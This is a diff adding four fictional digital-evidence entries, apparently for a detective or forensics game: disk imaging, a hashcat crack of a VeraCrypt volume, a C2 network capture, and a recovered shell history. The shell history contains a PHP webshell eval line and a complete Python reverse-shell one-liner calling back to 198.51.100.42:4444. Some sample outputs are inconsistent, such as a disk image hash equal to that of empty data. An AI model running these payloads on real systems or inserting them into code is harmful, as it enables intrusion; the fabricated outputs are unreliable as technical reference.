@@ -1053,6 +1053,356 @@
           ]
         }
       }
+    },
+        {
+      "ref_id": "ev_disk_imaging",
+      "title": "13 · Digital — Disk Imaging Session",
+      "description": "Blocks: status_banner, prompt_line, hash_matrix, file_tree. Theme: terminal. Template: disk_imaging.",
+      "evidence_type": "digital",
+      "is_initial": true,
+      "is_vital_for_conviction": false,
+      "metadata": {
+        "terminal": {
+          "v": 1,
+          "theme": "terminal",
+          "blocks": [
+            {
+              "id": "di_s1",
+              "type": "status_banner",
+              "span": 12,
+              "props": { "text": "DISK IMAGING SESSION", "tone": "info", "caption": "Case: CR-2024-008912" }
+            },
+            {
+              "id": "di_p1",
+              "type": "prompt_line",
+              "span": 12,
+              "props": {
+                "prompt": "root@forensic-workstation:~#",
+                "command": "lsblk -f",
+                "output": [
+                  "NAME      FSTYPE      LABEL    MOUNTPOINT",
+                  "sda       ext4        OS       /",
+                  "sdb       ntfs        EVIDENCE (not mounted)"
+                ],
+                "tone": "stdout"
+              }
+            },
+            {
+              "id": "di_p2",
+              "type": "prompt_line",
+              "span": 12,
+              "props": {
+                "prompt": "root@forensic-workstation:~#",
+                "command": "dd if=/dev/sdb of=/evidence/disk_image.dd bs=64K conv=sync,noerror status=progress",
+                "output": [
+                  "1258291200 bytes (1.3 GB, 1.2 GiB) copied, 42.3 s, 29.7 MB/s",
+                  "20480+0 records in",
+                  "20480+0 records out",
+                  "1073741824 bytes (1.1 GB, 1.0 GiB) copied, 45.1 s, 23.8 MB/s"
+                ],
+                "tone": "stdout"
+              }
+            },
+            {
+              "id": "di_s2",
+              "type": "status_banner",
+              "span": 12,
+              "props": { "text": "HASH VERIFICATION", "tone": "ok", "caption": "SHA-256 match confirmed" }
+            },
+            {
+              "id": "di_hm",
+              "type": "hash_matrix",
+              "span": 12,
+              "props": {
+                "algorithm": "sha256",
+                "rows": [
+                  { "offset": "00000000", "bytes": ["e3", "b0", "c4", "42", "98", "fc", "1c", "14", "9a", "fb", "f4", "c8", "99", "6f", "b9", "24"], "ascii": "................" },
+                  { "offset": "00000010", "bytes": ["27", "ae", "41", "e4", "64", "9b", "93", "4c", "a4", "95", "99", "1b", "78", "52", "b8", "55"], "ascii": "'..d...L...xR.U" }
+                ]
+              }
+            },
+            {
+              "id": "di_p3",
+              "type": "prompt_line",
+              "span": 12,
+              "props": {
+                "prompt": "root@forensic-workstation:~#",
+                "command": "sha256sum /evidence/disk_image.dd",
+                "output": ["e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  /evidence/disk_image.dd"],
+                "tone": "stdout"
+              }
+            },
+            {
+              "id": "di_ft",
+              "type": "file_tree",
+              "span": 12,
+              "props": {
+                "entries": [
+                  { "path": "/evidence/disk_image.dd", "size": "1.0 GB", "kind": "file", "state": "intact" },
+                  { "path": "/evidence/disk_image.dd.log", "size": "4.2 KB", "kind": "file", "state": "intact" }
+                ],
+                "indent": 2
+              }
+            }
+          ]
+        }
+      }
+    },
+
+    {
+      "ref_id": "ev_decryption_session",
+      "title": "14 · Digital — Decryption Session",
+      "description": "Blocks: status_banner, prompt_line, encryption_flow, file_tree. Theme: terminal. Template: decryption_session.",
+      "evidence_type": "digital",
+      "is_initial": true,
+      "is_vital_for_conviction": true,
+      "metadata": {
+        "terminal": {
+          "v": 1,
+          "theme": "terminal",
+          "blocks": [
+            {
+              "id": "ds_s1",
+              "type": "status_banner",
+              "span": 12,
+              "props": { "text": "DECRYPTION SESSION", "tone": "warn", "caption": "Target: suspect_laptop_veracrypt.hc" }
+            },
+            {
+              "id": "ds_p1",
+              "type": "prompt_line",
+              "span": 12,
+              "props": {
+                "prompt": "analyst@decrypt:~$",
+                "command": "veracrypt --text --mount /evidence/suspect_laptop_veracrypt.hc /mnt/decrypt",
+                "output": ["Enter password for /evidence/suspect_laptop_veracrypt.hc:", "***", "Incorrect password."],
+                "tone": "stderr"
+              }
+            },
+            {
+              "id": "ds_ef",
+              "type": "encryption_flow",
+              "span": 12,
+              "props": {
+                "algorithm": "aes",
+                "direction": "v",
+                "steps": [
+                  { "label": "Key Expansion", "detail": "Round keys derived from cipher key" },
+                  { "label": "Initial Round", "detail": "AddRoundKey" },
+                  { "label": "Rounds 1-9", "detail": "SubBytes → ShiftRows → MixColumns → AddRoundKey" },
+                  { "label": "Final Round", "detail": "SubBytes → ShiftRows → AddRoundKey" }
+                ]
+              }
+            },
+            {
+              "id": "ds_p2",
+              "type": "prompt_line",
+              "span": 12,
+              "props": {
+                "prompt": "analyst@decrypt:~$",
+                "command": "hashcat -m 13721 /evidence/suspect_laptop_veracrypt.hc /wordlists/rockyou.txt -r /rules/best64.rule",
+                "output": [
+                  "hashcat (v6.2.6) starting...",
+                  "Dictionary cache hit: rockyou.txt",
+                  "Progress: 12.3% (1452341/11818768)",
+                  "STATUS: CRACKED",
+                  "Password: Winter2024!"
+                ],
+                "tone": "ok"
+              }
+            },
+            {
+              "id": "ds_s2",
+              "type": "status_banner",
+              "span": 12,
+              "props": { "text": "PASSWORD RECOVERED", "tone": "ok", "caption": "Winter2024!" }
+            },
+            {
+              "id": "ds_p3",
+              "type": "prompt_line",
+              "span": 12,
+              "props": {
+                "prompt": "analyst@decrypt:~$",
+                "command": "veracrypt --text --mount /evidence/suspect_laptop_veracrypt.hc /mnt/decrypt --password=Winter2024!",
+                "output": ["Volume mounted successfully at /mnt/decrypt"],
+                "tone": "ok"
+              }
+            },
+            {
+              "id": "ds_ft",
+              "type": "file_tree",
+              "span": 12,
+              "props": {
+                "entries": [
+                  { "path": "/mnt/decrypt/financial_records.xlsx", "size": "2.4 MB", "kind": "file", "state": "intact" },
+                  { "path": "/mnt/decrypt/encrypted_comms/", "kind": "dir" },
+                  { "path": "/mnt/decrypt/encrypted_comms/signal_export.txt", "size": "892 KB", "kind": "file", "state": "intact" },
+                  { "path": "/mnt/decrypt/deleted_recovery/", "kind": "dir" },
+                  { "path": "/mnt/decrypt/deleted_recovery/recovered_photos/", "kind": "dir" }
+                ],
+                "indent": 2
+              }
+            }
+          ]
+        }
+      }
+    },
+
+    {
+      "ref_id": "ev_network_capture",
+      "title": "15 · Digital — Network Capture Analysis",
+      "description": "Blocks: status_banner, prompt_line, packet_trace, ascii_panel. Theme: terminal. Template: network_capture.",
+      "evidence_type": "digital",
+      "is_initial": true,
+      "is_vital_for_conviction": false,
+      "metadata": {
+        "terminal": {
+          "v": 1,
+          "theme": "terminal",
+          "blocks": [
+            {
+              "id": "nc_s1",
+              "type": "status_banner",
+              "span": 12,
+              "props": { "text": "NETWORK CAPTURE ANALYSIS", "tone": "info", "caption": "PCAP: traffic_capture_20240315.pcapng" }
+            },
+            {
+              "id": "nc_p1",
+              "type": "prompt_line",
+              "span": 12,
+              "props": {
+                "prompt": "analyst@netforensics:~$",
+                "command": "tshark -r traffic_capture_20240315.pcapng -Y \"tcp.port == 443\" -T fields -e frame.time -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport",
+                "output": [
+                  "2024-03-15 14:22:13.123  192.168.1.45  203.0.113.12  54321  443",
+                  "2024-03-15 14:22:13.145  203.0.113.12  192.168.1.45  443  54321",
+                  "2024-03-15 14:22:13.167  192.168.1.45  203.0.113.12  54321  443"
+                ],
+                "tone": "stdout"
+              }
+            },
+            {
+              "id": "nc_pt",
+              "type": "packet_trace",
+              "span": 12,
+              "props": {
+                "rows": [
+                  { "src": "192.168.1.45:54321", "dst": "203.0.113.12:443", "proto": "TCP", "bytes": "78", "state": "SYN_SENT" },
+                  { "src": "203.0.113.12:443", "dst": "192.168.1.45:54321", "proto": "TCP", "bytes": "74", "state": "SYN_RECEIVED" },
+                  { "src": "192.168.1.45:54321", "dst": "203.0.113.12:443", "proto": "TCP", "bytes": "66", "state": "ESTABLISHED" },
+                  { "src": "192.168.1.45:54321", "dst": "203.0.113.12:443", "proto": "TLS", "bytes": "517", "state": "CLIENT_HELLO" },
+                  { "src": "203.0.113.12:443", "dst": "192.168.1.45:54321", "proto": "TLS", "bytes": "1460", "state": "SERVER_HELLO" }
+                ]
+              }
+            },
+            {
+              "id": "nc_p2",
+              "type": "prompt_line",
+              "span": 12,
+              "props": {
+                "prompt": "analyst@netforensics:~$",
+                "command": "tshark -r traffic_capture_20240315.pcapng -Y \"dns\" -T fields -e dns.qry.name -e dns.a",
+                "output": ["malicious-c2.example.com  198.51.100.42", "updates.legit-service.com  203.0.113.12"],
+                "tone": "stdout"
+              }
+            },
+            {
+              "id": "nc_s2",
+              "type": "status_banner",
+              "span": 12,
+              "props": { "text": "SUSPICIOUS C2 DETECTED", "tone": "critical", "caption": "malicious-c2.example.com resolves to 198.51.100.42" }
+            },
+            {
+              "id": "nc_ap",
+              "type": "ascii_panel",
+              "span": 12,
+              "props": {
+                "frame": "box",
+                "caption": "C2 Communication Flow",
+                "lines": [
+                  "  [Victim]                                 [C2 Server]",
+                  "      |                                       |",
+                  "      |--- DNS Query: malicious-c2.example.com --->|",
+                  "      |<-- DNS Response: 198.51.100.42 -----------|",
+                  "      |                                       |",
+                  "      |=== TLS Handshake =======================>|",
+                  "      |<=== Encrypted Beacon ===================|",
+                  "      |                                       |"
+                ]
+              }
+            }
+          ]
+        }
+      }
+    },
+
+    {
+      "ref_id": "ev_shell_history",
+      "title": "16 · Digital — Shell History Reconstruction",
+      "description": "Blocks: status_banner, output_stream, ascii_panel. Theme: terminal. Template: shell_history.",
+      "evidence_type": "digital",
+      "is_initial": false,
+      "is_vital_for_conviction": true,
+      "metadata": {
+        "terminal": {
+          "v": 1,
+          "theme": "terminal",
+          "blocks": [
+            {
+              "id": "sh_s1",
+              "type": "status_banner",
+              "span": 12,
+              "props": { "text": "SHELL HISTORY RECONSTRUCTION", "tone": "info", "caption": "Source: /home/suspect/.bash_history (recovered)" }
+            },
+            {
+              "id": "sh_os",
+              "type": "output_stream",
+              "span": 12,
+              "props": {
+                "label": "RECONSTRUCTED SESSION",
+                "tone": "info",
+                "lines": [
+                  "suspect@target:~$ cd /var/www/html",
+                  "suspect@target:/var/www/html$ ls -la",
+                  "total 48",
+                  "drwxr-xr-x  3 www-data www-data  4096 Mar 10 09:15 .",
+                  "drwxr-xr-x  3 root     root      4096 Mar  1 12:00 ..",
+                  "-rw-r--r--  1 www-data www-data 12342 Mar 10 09:15 index.php",
+                  "suspect@target:/var/www/html$ cat index.php | grep -n eval",
+                  "42:  eval(base64_decode($_POST[\"payload\"]));",
+                  "suspect@target:/var/www/html$ whoami",
+                  "www-data",
+                  "suspect@target:/var/www/html$ id",
+                  "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+                  "suspect@target:/var/www/html$ python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"198.51.100.42\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\""
+                ]
+              }
+            },
+            {
+              "id": "sh_s2",
+              "type": "status_banner",
+              "span": 12,
+              "props": { "text": "REVERSE SHELL DETECTED", "tone": "critical", "caption": "Callback to 198.51.100.42:4444" }
+            },
+            {
+              "id": "sh_ap",
+              "type": "ascii_panel",
+              "span": 12,
+              "props": {
+                "frame": "heavy",
+                "caption": "Attack Timeline",
+                "lines": [
+                  "Mar 10 09:15:22  Webshell uploaded via vulnerable upload.php",
+                  "Mar 10 09:15:45  Attacker enumerates web directory",
+                  "Mar 10 09:16:12  Webshell executes: eval(base64_decode(...))",
+                  "Mar 10 09:16:30  Reverse shell spawned to C2",
+                  "Mar 10 09:17:05  Attacker gains www-data shell",
+                  "Mar 10 09:18:22  Lateral movement attempted"
+                ]
+              }
+            }
+          ]
+        }
+      }
     }
   ],
 
